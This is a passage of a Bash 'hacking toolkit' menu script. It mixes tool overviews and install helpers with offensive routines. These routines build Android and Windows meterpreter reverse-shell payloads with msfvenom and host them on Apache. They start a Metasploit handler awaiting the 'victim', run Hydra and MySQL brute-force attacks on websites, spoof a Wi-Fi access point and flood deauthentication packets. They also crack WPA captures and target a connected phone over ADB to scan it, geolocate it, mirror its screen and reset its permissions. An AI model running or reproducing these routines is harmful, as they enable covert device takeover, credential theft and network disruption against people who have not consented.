	Hydra provides advanced options for specific protocols. For example, when targeting SSH, you can specify the port, specify a list of known private keys, and more.
	Wordlist Usage:

	A wordlist is a critical component of a successful password-cracking attack. You can create your wordlist or use existing ones. Hydra will iterate through the list to guess passwords.
	Reporting and Output:

	Hydra provides options to save the results to a file for later analysis. You can choose different output formats, such as plain text or JSON.
	Safety and Ethical Considerations:

	It's essential to use Hydra responsibly and within the bounds of ethical hacking and penetration testing. Unauthorized password cracking is illegal and unethical.
	
        \033[0m"
        ;;
        "burpsuite")
        echo -e "\033[31m
        [+] BASIC ==> Burp Suite is a powerful and widely-used web application security testing tool developed by PortSwigger.
        It's primarily designed for finding and identifying security vulnerabilities in web applications.
        Burp Suite is commonly used by security professionals, ethical hackers, and penetration testers. Here's an overview of Burp Suite and its usage:
        
        [+] ADVANCE ==> Basic Usage:
	To use Burp Suite, follow these basic steps:

	Launch Burp Suite.
	Configure your web browser to route traffic through Burp's proxy.
	Browse the target web application while Burp captures and intercepts the HTTP requests and responses.
	Analyze, manipulate, and test the requests and responses using Burp's various tools and features.
	Proxy and Intercept:

	One of the core features of Burp Suite is its proxy, which allows you to intercept and inspect HTTP requests and responses between your browser and the target web application. 
	You can use this to identify security vulnerabilities, such as Cross-Site Scripting (XSS) or SQL Injection.
	Scanner:

	Burp Scanner is an automated vulnerability scanner that can identify a wide range of web application vulnerabilities, including SQL injection, XSS, CSRF, and more.
	It can be configured to scan specific parts of a web application or the entire site.
	Repeater:

	The Repeater tool allows you to manipulate and resend individual HTTP requests to the server. This is useful for testing the impact of different payloads or to verify the existence of vulnerabilities.
	Intruder:

	Burp's Intruder tool is used for performing automated attacks, such as brute-force attacks, fuzzing, and payload-based attacks, to discover vulnerabilities in input fields and parameters.
	Spider:

	Burp's Spider tool automatically crawls and maps out the target web application by following links and identifying different parts of the application. This helps in understanding the application's structure.
	Sequencer:

	The Sequencer tool is used for analyzing the quality of randomness in tokens or session identifiers. This can be crucial when assessing the security of authentication and session management.
	Extensibility:

	Burp Suite supports the use of extensions, which are custom scripts or plugins that can be written in various languages (e.g., Python, Ruby). 
	You can create your extensions to enhance Burp's functionality or integrate it with other tools.
	Reporting:

	Burp Suite allows you to generate detailed vulnerability assessment reports in various formats, making it easy to communicate findings to stakeholders.
	Configuration:

	Burp Suite offers extensive configuration options, allowing you to customize proxy settings, SSL certificates, and various tool-specific settings to suit your testing requirements.
        \033[0m"
        ;;
        "metasploit")
        
        echo -e "\033[31m
	[+] Metasploit is a widely-used penetration testing framework and exploitation toolset. 
	Developed by Rapid7, it provides security professionals, ethical hackers, 
	and penetration testers with a comprehensive suite of tools to discover, 
	exploit, and validate vulnerabilities in computer systems and networks. Here's an overview of Metasploit:

	[+] ADVANCE DETAILS ==> Installation:
	Metasploit can be installed on various platforms, including Windows, Linux, and macOS.
	In Kali Linux, Metasploit is pre-installed. For other platforms,
	you can follow the installation instructions provided on the Rapid7 website.

	Basic Usage:
	To use Metasploit, you typically interact with it through its command-line interface (CLI) or 
	the Metasploit Framework Console (msfconsole). Here's how to launch msfconsole and perform some basic actions:

	Open a terminal and run msfconsole to start Metasploit.
	Once inside msfconsole, you can use various commands to 
	search for exploits, configure payloads, and launch attacks.
	Modules:
	Metasploit is organized into modules, which are pre-written pieces of code that perform specific tasks. 
	These modules include:

	Exploits: These modules contain code that can exploit vulnerabilities in target systems.
	Payloads: Payloads are what attackers deliver once they've successfully exploited a vulnerability. Metasploit offers various payloads for different purposes.
	Auxiliary: Auxiliary modules perform various tasks such as scanning, fingerprinting, and information gathering.
	Post-exploitation: These modules are used after a successful exploit to maintain access, gather information, or perform other actions on the compromised system.
	Exploiting Vulnerabilities:
	A typical workflow in Metasploit involves:

	Searching for an exploit module related to a specific vulnerability.
	Configuring the exploit module with target information.
	Selecting a payload.
	Executing the exploit to compromise the target
	
	[+] EXAMPLE COMMAND ==>
	msfconsole
	use exploit/windows/smb/ms17_010_eternalblue
	set RHOSTS <target_IP>
	set PAYLOAD windows/x64/meterpreter/reverse_tcp
	exploit
	Post-exploitation:
	After gaining access to a target system, you can use post-exploitation modules to perform tasks like gathering information, pivoting to other systems, or maintaining access.

	Resource Scripts:
	Metasploit allows you to create resource scripts that automate sequences of commands, making it easier to replicate specific actions or attacks.

	Reporting:
	Metasploit provides tools for generating reports that document your findings and actions during a penetration test.

	Community and Commercial Editions:
	Metasploit is available in both open-source community and commercial editions. The community edition provides a wide range of functionality, while the commercial edition offers additional features, support, and modules.
\033[0m"
        ;;
        "nmap")
echo -e "\033[31m
        [+] BASIC ==> Nmap, short for Network Mapper, is a powerful and popular open-source network scanning and discovery tool.
        It's commonly used by network administrators, security professionals, and ethical hackers to assess and analyze network hosts and services. 
        Here's an overview of Nmap and its usage:
        Basic Usage:
	Nmap is primarily used from the command line. The basic syntax for running an Nmap scan is:
	nmap [scan options] target
	[scan options]: Various scan techniques and options you can customize.
	target: The target host(s) or IP address(es) to scan.
	Example:
	nmap -v -A 192.168.1.1
	Common Options:

	-v: Increase verbosity to see more details about the scan.
	-A: Enable OS detection, version detection, script scanning, and traceroute.
	-p: Specify specific ports or port ranges to scan.
	-sS, -sT, -sU: Choose between TCP SYN, TCP Connect, or UDP scanning methods.
	-oN, -oX, -oG: Specify output formats (normal, XML, or grepable).
	-T: Set the timing template for scan speed and aggressiveness (e.g., -T4 for aggressive scans).
	Scanning Techniques:

	Nmap supports various scanning techniques, including host discovery, port scanning, version detection, OS detection, and script scanning. 
	You can choose the appropriate options and techniques based on your scanning goals.
	Scripting Engine:

	Nmap has a built-in scripting engine (NSE - Nmap Scripting Engine) that allows you to write and run custom scripts for advanced scanning and testing.
	These scripts can perform various tasks, such as vulnerability detection, service enumeration, and more.
	Output and Reporting:

	Nmap provides various output formats, including interactive console output, plain text, XML, and grepable formats. 
	You can save scan results to files and use tools like grep or Nmap's built-in parsers to extract specific information from the reports.
	Integration with Other Tools:

	Nmap can be integrated with other security tools and scripts to automate and extend its functionality.
	For example, you can use Nmap with vulnerability scanners like Nessus or with penetration testing frameworks like Metasploit.
\033[0m"
        ;;
        "nano")
        read -p "[+] ENTER THE DESTINATION OF YOUR FILE:" nano_fle
        nano $nano_fle
        ;;
        "cat")
        read -p "[+] ENTER DESTINATION OF YOUR FILE:" cat_fle
        cat $cat_fle
        ;;
        "mkdir")
        read -p "[+] ENTER THE NAME OF YOUR FILE:" cr_fle
        mkdir $cr_fle
        ;;
        4)
        echo "[+] DOWNLOADING ALL REQUIRED COMPONENTS" | lolcat
        echo "[+] KINDLY ENABLE ROOT MODE" | lolcat
        sudo apt install adb
        sudo apt install nmap
        sudo apt install snap
        sudo apt install figlet
        sudo apt install python3
        sudo apt install pip
        sudo apt install lolcat
        echo "[-] INSTALLED COMPLETELY" | lolcat
        ;;
        mbrute)
        echo "[+] THIS MAY NOT WORK STILL UNDER DEVLOPMENT"
        read -p "[+] ENTER WEBSITE ADDRESS: " domain

        # Find IP of domain
        ip=$(dig +short $domain)
        echo "[+] WEBSITE IP: $ip"

        read -p "[+] SINGLE USERNAME OR USERNAME FILE [u/f]: " choice

        if [ "$choice" == "u" ]; then
            read -p "[+] Enter username: " usr
            user_option="USERNAMES=$usr"
        elif [ "$choice" == "f" ]; then
            read -p "[+] Enter path to username file: " user_file
            usernames=$(cat $user_file | tr '\n' ',')
            user_option="USERNAMES=$usr"
        else
            echo "Invalid choice"
            exit 1
        fi

        # Prompt user for password file
        read -p "[+] Enter path to password file: " pass_file

        # Set additional options
        blank_passwords="true"
        bruteforce_speed="5"
        stop_on_success="false"
        threads="1"
        verbose="true"

        # Open msfconsole and run auxiliary/scanner/mysql/mysql_login module
        msfconsole -x "use auxiliary/scanner/mysql/mysql_login; set RHOSTS $ip; set RPORT 3306; set PASS_FILE $pass_file; set $user_option; set BLANK_PASSWORDS $blank_passwords; set BRUTEFORCE_SPEED $bruteforce_speed; set STOP_ON_SUCCESS $stop_on_success; set THREADS $threads; set VERBOSE $verbose; exploit; exit"
        ;;
        5)
        echo "[+] STARTING 5555 PORTS ON CONNECTED DEVICE" | lolcat
        connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
        sudo apt install adb | lolcat
        sudo apt install nmap | lolcat
        adb tcpip 5555 
        echo "[+] SEARCHING ALL OPEN PORTS ON VICTEM'S DEVICE"
        echo -e "\n\n\n\n"
        nmap $connected_device_ip | lolcat
        echo "[-] 5555 PORTS ARE OPENED" | lolcat
        ;;
        6)
        connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
        MAIN_DEVICE_PUBLIC_IP=$(curl -s https://api.ipify.org)MAIN_DEVICE_PRIVATE_IP=$(hostname -I | awk '{print $1}')
        own_ip=$(hostname -I | awk '{ print $1 }')
        MAIN_DEVICE_PUBLIC_IP=$(curl -s https://api.ipify.org)
        CONNECTED_DEVICE_PUBLIC_IP=$(adb shell curl -s https://api.ipify.org)
        LOCATION_DATA=$(curl -s "https://ipapi.co/$IP_ADDRESS/json/")
        CITY=$(echo $LOCATION_DATA | jq -r '.city')
        REGION=$(echo $LOCATION_DATA | jq -r '.region')
        COUNTRY=$(echo $LOCATION_DATA | jq -r '.country_name')

        echo -e "\n\n"
        echo "[-]STARTING ATTACK TO CONNECTED DEVICE..." | lolcat
        echo "[+] INFORMATION:" | lolcat
        echo "[+] PRIVATE IP OF THIS DEVICE: $own_ip" | lolcat
        echo "[+} PUBLIC IP OF THIS DEVICE: $MAIN_DEVICE_PUBLIC_IP" | lolcat
        echo -e "\n\n"
        echo "[+] VICTEM'S DETAILS" | lolcat
        echo "[+] VICTEM'S PRIVATE IP: $connected_device_ip" | lolcat
        echo "[+] VICTEM'S PUBLIC IP: $CONNECTED_DEVICE_PUBLIC_IP"| lolcat 
        IP_ADDRESS=$1
        echo -e "\n\n"
        echo "[+] CHECKING LOCATION OF VICTEM'S PUBLIC IP: $IP_ADDRESS" | lolcat
        echo "[+] City: $CITY"| lolcat 
        echo "[+] Region: $REGION" | lolcat
        echo "[+] Country: $COUNTRY" | lolcat
        echo -e "\n\n"
        echo "[+] CHECKING ALL OPEN PORTS OF VICTEM DEVICE..." | lolcat
        nmap $connected_device_ip | lolcat
        echo -e "\n\n\n"
        ;;
        7)
        connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
        echo "[+] VICTEM'S PRIVATE IP:$connected_device_ip"
        echo "[+] CHECKING ALL OPEN PORTS OF VICTEM'S DEVICE..."
        nmap $connected_device_ip
        echo "[+] STARTING SCRCPY TO MONITOR DEVICE PLEASE BE IN SAME NETWORK..."
        echo "[-] FOR ANY HELP RELATED TO SCRCPY TYPE: SCRCPY HELP"
        scrcpy
        ;;
        8)
        echo "[+] REMOVING LOCKSCREEN BUT NOT ALL VERSION IS SUPPORTED" | lolcat
        adb shell pm reset-permissions
        ;;
        9)
        city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
        if [[ $city != "" ]]; then
        echo -e "${lh}[*] City Location:${n}" $city
        fi
        ;;
        "remove files")

        ls | lolcat
        removefiles= ls && read -p "[+] Enter the names of file to delete:" dfiles && rm -rf $dfiles && echo "[+] REMOVING $dfiles"
        $removefiles
        ;;
        "removefiles")
        removefiles= ls && read -p "[+] Enter the names of file to delete:" dfiles && rm -rf $dfiles && echo "[+] REMOVING $dfiles"
        $removefiles
        ;;
        30)
        echo "THIS MAY NOT WORK [UNDER BETA]"
        read -p "[+] Enter the URL or domain name: " url
        echo "[+] URL ==> $url"
        read -p "[+] Enter the path to the wordlist file: " wordlist
        echo "[+] WORDLIST ==> $wordlist"
        read -p "[+] Enter the username: " husr
        echo "[+] USERNAME ==> $husr"

        ip=$(dig +short $(echo "$url" | awk -F[/:] '{print $4}'))

        if [[ -z $ip ]]; then
        echo "[-] Failed to retrieve the IP address for the given URL or domain name."
        exit 1                                                                                                                                                                                                                                                                                                                                                  
        fi

        echo "[+] IP OF WEB ==> $ip"
        echo "Starting brute-force attack..."
        echo "[+] COMMAND ==> hydra -l $husr -P $wordlist $ip http-get /login -V "

        hydra -l $husr -P $wordlist $ip http-get /login -V

        if [ $? -eq 0 ]; then
        echo "Brute force attack successful! Username: $username, Password found in $wordlist"
        else
        echo "Brute force attack unsuccessful."
        fi                                                                                                                                          
        ;;
        "pdfpass")
        validate_destination
        set_pdf_password
        ;;
        "rpp")
        validate_destination
        remove_pdf_password
        ;;
        "itp")
        validate_number_of_images
        convert_to_pdf
        ;;
        10)
        echo "[+] INSTALLING SOFTWARES..." | lolcat
        echo "[-] MICROSOFT EDGE" | lolcat
        echo "[-] GOOGLE CHROME" | lolcat
        echo "[-] VSCODE" | lolcat
        echo "[-] BLENDER" | lolcat
        echo "[+] INSTALLING WGET" | lolcat
        sudo apt install wget                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
        echo "[+]  DOWNLOADING FILE..." | lolcat
        wget https://packages.microsoft.com/repos/edge/pool/main/m/microsoft-edge-beta/microsoft-edge-beta_114.0.1823.11-1_amd64.deb
        echo "[+] EXTRACTING FILE" | lolcat
        sudo dpkg -i microsoft-edge-beta_114.0.1823.11-1_amd64.deb
        echo "[+] INSTALLING SOFTWARE PLEASE WAIT..." | lolcat
        sudo apt-get install -f
        echo "[+] MICROSOFT EDGE INSTALLED COMPLETELY [✓]"
        echo -e "\n\n\n"
        echo "[+] INSTALLING VS-CODE" | lolcat
        sudo apt install code-oss
        echo "[+] VS-CODE INSTALLED COMPLETELY [✓]" | lolcat
        echo "[+] INSTALLING BLENDER..." | lolcat
        sudo apt  install blender
        echo "[+]  BLENDER INSTALLED COMPLETELY [✓]" | lolcat
        echo "[+] INSTALLING CHROME " | lolcat
        wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
        echo "[+] EXTRACTING FILE..." | lolcat
        sudo dpkg -i google-chrome-stable_current_amd64.deb
	sudo apt-get install -f
        echo "[+] CHROME INSTALLED COMPLETELY [✓]"
        ;;
        cpdf)
        validate_destination
        validate_compression_size

        # Convert the KB size to bytes for comparison
        size_bytes=$((size_kb * 1024))

        # Compress the PDF to the specified size using Ghostscript
        output_file="${destination%.pdf}_compressed.pdf"
        gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/screen -dNOPAUSE -dBATCH -sOutputFile="$output_file" "$destination"

        # Check the compressed file size and iterate until it reaches the desired size
        while [ $(wc -c < "$output_file") -gt "$size_bytes" ]; do
            gs -q -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/screen -dNOPAUSE -dBATCH -dNumRenderingThreads=2 -sOutputFile="$output_file" "$output_file"
        done

        echo "PDF compression completed. Compressed file: $output_file"
        ;;
        11)
        echo "[+] INSTALLING SPOTIFY..." | lolcat
        sudo apt install snap
        sudo systemctl start snapd
        sudo snap install spotify
        echo "[+] SPOTIFY INSTALL COMPLETELY [✓]" | lolcat
        echo "[+] INSTALLING TELEGRAM..." | lolcat
        sudo apt install telegram-desktop
        echo "[+] INSTALLED TELEGRAM COMPLETELY [✓]"
        ;;
        "b")
        main_banner
        ;;
        12)
        echo "[+] INSTALLING FIGLET" | lolcat
        echo "[+] INSTALLING LOLCAT" | lolcat
        echo "[+] INSTALLING SNAP " | lolcat
        echo "[+] INSTALLING ADB {ANDROID DEBUG BRIDGE}" | lolcat
        echo "[+] INSTALLING ALL WALLPAPERS OF KALI " | lolcat
        sudo apt install figlet
        sudo apt install adb
        sudo apt install lolcat
        sudo apt install snap
        sudo apt install kali-wallpapers-all
        ;;
        "install telegram")
        echo "[+] INSTALLING TELEGRAM" | lolcat
        sudo apt install telegram-desktop
        ;;
        "ls")
        ls | lolcat
        ;;
        13)
        figlet -c "PHONEINFOS" | lolcat
        figlet -c "BY AVS" | lolcat
        api_key_file="$HOME/.numverify_api_key"

        # Check if the API key file exists
        if [[ -f "$api_key_file" ]]; then
        # Read the API key from the file
        api_key=$(cat "$api_key_file")
        else
        # Prompt the user to enter their API key
        echo "[+] Enter your API key:" && read api_key

        # Save the API key to the file
        echo "$api_key" > "$api_key_file"
        fi

        # Get the phone number from the user
        echo "[+]WRITE YOUR PHONE NUMBER WITH COUNTRY CODE WITHOUT +: 12345678901" | lolcat && read input | lolcat
        echo "[-] IF THE DETAILS ARE BLANK THEN CHECK YOUR API KEY"
        echo "[+] USE [write new api] TO REWRITE API"

        # Check if the user wants to enter a new API key
        if [[ "$input" == "write new api" ]]; then
        # Prompt the user to enter a new API key
        echo "[+] Enter a new API key:"
        read api_key

        # Save the new API key to the file
        echo "$api_key" > "$api_key_file"

        # Get the phone number from the user
        echo "[+] PHONE NUMBER WITH COUNTRY CODE:"
        read phone_number
        else
        # Use the input as the phone number
        phone_number="$input"
        fi

        # Get the country and location from the phone number
        response=$(curl -s "http://apilayer.net/api/validate?access_key=$api_key&number=$phone_number")
        country=$(echo "$response" | grep -oP '(?<="country_name":")[^"]*')
        location=$(echo "$response" | grep -oP '(?<="location":")[^"]*')

        # Print the results
        echo "[+] COUNTRY: $country"
        echo "[+] STATE: $location"
        ;;
        14)
        read -p "[+] DESTINATION OF YOUR FILE: " file_path
        echo "[+] SCANNING VIRUSES..."

        result=$(clamscan --bell -i "$file_path")

        if [[ $result == *"Infected files: 0"* ]]; then
            echo "[+] NO VIRUS FOUND IN THIS FILE"
        else
            echo "[-] VIRUS FOUND IN THIS FILE"
        fi
        ;;
        "msfconsole")
        msfconsole
        ;;
        15)
        read -p "[+] ENTER THE URL OF YOUR WEB: " website_url
        echo "[+] WEBSITE SCANNING..." | lolcat

        # Check if the website's SSL certificate is valid
        if wget --spider --quiet --https-only --secure-protocol=auto "$website_url"; then
            echo "[+] THIS WEBSITE HAS A VALID SSL CERTIFICATE" | lolcat
        else
            echo "[-] BE CAREFUL: THIS WEBSITE'S SSL CERTIFICATE IS NOT VALID" | lolcat
        fi
        ;;
        "install chrome")
        echo "[+] INSTALLING CHROME " | lolcat
        wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
        echo "[+] EXTRACTING FILE..." | lolcat
        sudo dpkg -i google-chrome-stable_current_amd64.deb
	    sudo apt-get install -fs
        echo "[+] CHROME INSTALLED COMPLETELY [✓]"
        ;;
        16)
        echo "Scanning for viruses..."

        clamscan -r --bell -i / | while read -r line; do
            if [[ $line == *"Scanning"* ]]; then
                # Extract the current and total number of files from the line
                current=$(echo "$line" | grep -oP '(?<=Scanning ).*(?=\/)')
                total=$(echo "$line" | grep -oP '(?<=\/).*')
                # Calculate the progress as a percentage
                progress=$((current * 100 / total))
                # Print the progress
                printf "\rProgress: %d%%" "$progress"
            fi
        done

        echo ""
        ;;
        17)
        echo "[+] CREATING PAYLOAD FOR ANDROID..." | lolcat
        own_ip=$(hostname -I | awk '{ print $1 }')
        read -p "[+] YOUR SOFTWARE DESTINATION (ENTER IF NO):" software_destination

        if [[ -n $software_destination ]]; then
        # Execute command with software destination
        msfvenom -x $software_destination -p android/meterpreter/reverse_tcp lhost=$own_ip lport=6666 -o Avs-andropayload.apk
        else
        # Execute command without software destination
        msfvenom -p android/meterpreter/reverse_tcp lhost=$own_ip lport=6666 -o Avs-andropayload.apk
        fi
        echo "[+] PAYLOAD CREATED: Avs-andropayload.apk " | lolcat        
        echo "[-] STARTING APACHE2 SERVICE..." | lolcat
        service apache2 start
	if [ -f Avs-andropayload.apk ]; then

	  # Ask for confirmation
	  echo "[+] DO YOU WANT TO MOVE APPM.APK TO /VAR/WWW/HTML? [y/n]" 
	  read response

	  # If the user says yes, move the file
	  if [[ $response == "y" ]]; then
	    mv Avs-andropayload.apk /var/www/html
	  else
	    echo "File not moved."
	  fi

	else
	  echo "File does not exist."
	fi
	cd /var/www/html
	echo "[+] CHANGED DIRECTORY TO /VAR/WWW/HTML" | lolcat
        echo "[+] EXECUTING COMMANDS TO START HACKING..." | lolcat
        echo "[-] STARTING THE EXPLOIT..." | lolcat
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $own_ip; set LPORT 6666; run"
        echo "[+] PAYLOAD IS STARTED WAITING FOR VICTEM TO CONNECT..." | lolcat
        ;;
        "install tplink wifi adapter's Driver")
        echo "[+] INSTALLING DRIVER..."
        sudo apt install realtek-rtl88xxau-dkms
        ;;
        18)
        echo "[+] CREATING PAYLOAD FOR WINDOWS..." | lolcat
        own_ip=$(hostname -I | awk '{ print $1 }')
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$own_ip LPORT=6666 -f exe -o Avs-winpayload.exe
        echo "[+] PAYLOAD CREATED: Avs-winpayload.exe " | lolcat        
        echo "[-] STARTING APACHE2 SERVICE..." | lolcat
        service apache2 start
	if [ -f Avs-winpayload.exe ]; then

	  # Ask for confirmation
	  echo "[+] DO YOU WANT TO MOVE CREATED PAYLOAD TO /VAR/WWW/HTML? [y/n]" 
	  read response

	  # If the user says yes, move the file
	  if [[ $response == "y" ]]; then
	    mv Avs-winpayload.exe /var/www/html
	  else
	    echo "File not moved."
	  fi

	else
	  echo "File does not exist."
	fi
	cd /var/www/html
	echo "[+] CHANGED DIRECTORY TO /VAR/WWW/HTML" | lolcat
        echo "[+] EXECUTING COMMANDS TO START HACKING..." | lolcat
        echo "[-] STARTING THE EXPLOIT..." | lolcat
        msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $own_ip; set LPORT 6666; run"
        echo "[+] PAYLOAD IS STARTED WAITING FOR VICTEM TO CONNECT..." | lolcat
        ;;
        19)
        echo "[+] CREATING DIRECTORY... " | lolcat
        mkdir ~/.themes
        mkdir ~/.icons
        cd ~/.themes
        echo "[+] DOWNLOADING ALL REQUIRED PACKAGES..." | lolcat
        echo "[+] DOWNLOADING SHELL FILE..."
        git clone https://github.com/B00merang-Project/macOS.git
        git clone https://github.com/B00merang-Project/macOS-Catalina-Dark.git
        echo "[+] INSTALLING PLANK..." | lolcat
        sudo apt install plank
        cd ~/.icons
        echo "[+] INSTALLING WGET..." | lolcat
        sudo apt install wget
        echo "[+] DOWNLOADING ICON PACK"
        wget https://github.com/keeferrourke/la-capitaine-icon-theme/archive/refs/tags/v0.6.2.zip
        echo "[+] UNZIPPING ICON PACK..."
        unzip v0.6.2.zip
        rm -i v0.6.2.zip
        echo "[+] DOWNLOADING IS COMPLETED..."
        echo "[+] OPENING GNOME-TWEAKS"
        echo "[+] THAT'S IT AS A TEXT BASED TOOL I CAN'T CHANGE THE THEME OF YOUR KALI MACHINE SO TO CHANGE THE APPEARANCE GO TO APPEARANCE THEN IN SHELL CHOOSE MAC OS, IN ICONS CHOOSE la-capitaine-icon-theme AND IN STARTUP APPS ADD A NEW APP AND ADD PLANK, GO TO THEMES AND DISABLE DASH-TO-DOCK DONE. THANKYOU."
        gnome-tweaks
        ;;
        "99")
        show_help
        add_commands
        ;;
        20)
	    default_interface="wlan0"
        interface=${interface:-$default_interface}
        read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
        echo "[1] 2Ghz WIFI SCAN"
        echo "[2] 5Ghz WIFI SCAN"
        echo "[3] BOTH 2Ghz AND 5Ghz WIFI SCAN "
        read -p "[+] ENTER YOUR SCAN:" newchoice
        if [ "$newchoice" == "1" ]; then
            sudo airodump-ng $interface
        elif [ "$newchoice" == "2" ]; then
            sudo airodump-ng --band a $interface
        elif [ "$newchoice" == "3" ]; then
            sudo airodump-ng --band abg $interface
        else
            echo "Invalid option selected"
        fi
        ;;
        21)
	default_bssid="D0:31:45:F3:D5:8D"
	default_name="WIFI POINT"
	default_interface="wlan0"

	read -p "[+] Enter the name of the WiFi (default: $default_name): " name_of_wifi
	name_of_wifi=${name_of_wifi:-$default_name}
	echo "[+] WIFI NAME ==> $name_of_wifi" | lolcat

	read -p "[+] Enter the BSSID (default: $default_bssid): " bssid
	bssid=${bssid:-$default_bssid}
	echo "[+] WIFI BSSID ==> $bssid" | lolcat
	read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
	interface=${interface:-$default_interface}
	echo "[+] INTERFACE ==> $interface" | lolcat
    echo "[+] COMMAND ==> airbase-ng -a $bssid --essid "$name_of_wifi" -c 5 $interface"
	airbase-ng -a $bssid --essid "$name_of_wifi" -c 5 $interface

	echo "[+] FAKE WIFI IS SUCCESSFULLY CREATED." | lolcat
        ;;
        "set monitor mode")
        default_interface="wlan0"
        interface=${interface:-$default_interface}
        read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
        sudo iwconfig $interface mode monitor
        echo "[+] CHANGED $interface TO MONITOR MODE."
        iwconfig
        ;;
        31)
	default_interface="wlan0"
    interface=${interface:-$default_interface}
    read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
    echo "[+] INTERFACE ==> $interface"
    echo "[+] COMMAND ==> sudo airmon-ng check kill "
    sudo airmon-ng check kill
    echo "[+] COMMAND ===> sudo airmon-ng start $interface "
    sudo airmon-ng start $interface
    echo "__________________________________________________________________________________________________________"
    sudo airmon-ng
        ;;
        32)
	    default_interface="wlan0"
        read -p "[+] ENTER WHAT WILL BE THE NAME OF THE CAPTURE FILE: " nname
        echo "[+] NAME OF CAP FILE ==> $nname"
        read -p "[+] ENTER THE CHANNEL OF WIFI: " channel
        echo "[+] CHANNEL ==> $channel"
        read -p "[+] ENTER BSSID OF YOUR WIFI: " nbssid
        echo "[+] BSSID ==> $nbssid"
        read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
        echo "[+] INTERFACE ==> $interface"
	    interface=${interface:-$default_interface}
        echo "[+] COMMAND ==> sudo airodump-ng -w $nname -c $channel --bssid $nbssid $interface "
        sudo airodump-ng -w $nname -c $channel --bssid $nbssid $interface
        ;;
        33)
        read -p "[+] ENTER BSSID OF YOUR WIFI: " bssid
        echo "[+] BSSID ==> $bssid"
        read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
        echo "[+] WIFI INTERFACE ==> $interface"
        echo "[+] COMMAND ==> sudo aireplay-ng --deauth 0 -a  $bssid $interface "
        sudo aireplay-ng --deauth 0 -a  $bssid $interface
        ;;
        22)
        read -p "[+] ENTER THE NAME OF WIFI CAPTURE FILE {.cap FILE}: " capfile
        echo "[+] CAP FILE NAME ==> $capfile"
        read -p "[+] ENTER THE DESTINATION OR NAME OF WORDLIST TO CRACK: " wordlist
        echo "[+] WORDLIST DESTINATION ==> $wordlist "
        echo "[+] COMMAND ==> aircrack-ng $capfile -w $wordlist "
        aircrack-ng $capfile -w $wordlist
        ;;
        "pwd")
        pwd
        ;;
        23)
	default_bssid="D0:31:45:F3:D5:8D"
	default_name="WIFI POINT"
	default_interface="wlan0"
	interface=${interface:-$default_interface}
	read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
	echo "[+] TESTING PACKET INJECTION" | lolcat
    echo "[+] COMMAND ==> sudo aireplay-ng --test $interface "
	sudo aireplay-ng --test $interface
	read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
	echo "[+] MONITORING 5Ghz NETWORK NEAR YOU"
    echo "[+] COMMAND ==> sudo airodump-ng --band a $interface "
	sudo airodump-ng --band a $interface
        ;;
        "reboot")
        reboot
        ;;
        "set managed mode")
        default_interface="wlan0"
        interface=${interface:-$default_interface}
        read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
        sudo iwconfig $interface mode managed
        echo "[+] CHANGED $interface TO MANAGED MODE."
        iwconfig
        ;;
        "install metasploit on termux")
	pkg update && pkg upgrade
	pkg install -U git python ruby wget
	cd
	wget https://github.com/rapid7/metasploit-framework/archive/master.zip
	unzip master.zip
	rm master.zip
	cd metasploit-framework-master
	./msfconsole
        ;;
        "scrcpy help")
        echo "[-] SORRY SIR IF YOU'RE FACING ISSUE RELATED TO SCRCPY" | lolcat
        echo "[+] SOLUTION 1:"| lolcat
        echo "[+] type: 'install scrcpy' TO INSTALL IT MAY BE THIS WILL HELP YOU" | lolcat
        echo "[-] SOLUTION 2: " | lolcat
        echo "[+] BE IN SAME NETWORK AND TRY ADB CONNECT [VICTEM'S IP]:[OPEN PORT OF VICTEM'S DEVICE]" | lolcat
        echo "[+] THANKYOU. IF STILL IT CAN'T HELP YOU THEN KINDLY JOIN OUR DISCORD TYPE 'links' FOR OUR DISCORD LINK ^-^ " | lolcat
        
        ;;
        "install scrcpy")
        sudo apt install git
        sudo apt install ffmpeg libsdl2-2.0-0 adb wget \
                 gcc git pkg-config meson ninja-build libsdl2-dev \
                 libavcodec-dev libavdevice-dev libavformat-dev libavutil-dev \
                 libswresample-dev libusb-1.0-0 libusb-1.0-0-dev
        git clone https://github.com/Genymobile/scrcpy.git
        cd scrcpy
        chmod +x *
	./install_release.sh
        ;;
        "iwconfig")
        iwconfig | lolcat
        ;;
        "ifconfig")
        ifconfig | lolcat
        ;;
        "open "*)
            software=${user_input#* }
            software_path=$(which $software)
            if [ -z "$software_path" ]
            then
                echo "Software not found"
            else
                xdg-open $software_path
            fi
            ;;
        "install bluetooth")
        echo "[+] INSTALLING BLUETOOTH DRIVERS" | lolcat
        sudo apt-get install bluetooth bluez bluez-tools rfkill -y
        echo "[+] STARTING BLUETOOTH SERVICES" | lolcat
        sudo systemctl start bluetooth
        sudo systemctl enable bluetooth
        sudo systemctl status bluetooth
        sudo rfkill unblock bluetooth
        echo "[+] INSTALLATION COMPLETED [✓] " | lolcat
        echo "[+] SCANING ALL AVAILABLE BLUETOOTH DEVICE" | lolcat
        hcitool scan
        ;;
        "install virtual box")
        echo "[+] INSTALLING VIRTUAL BOX FOR LINUX" | lolcat
        sudo apt install -y dkms linux-headers-$(uname -r)
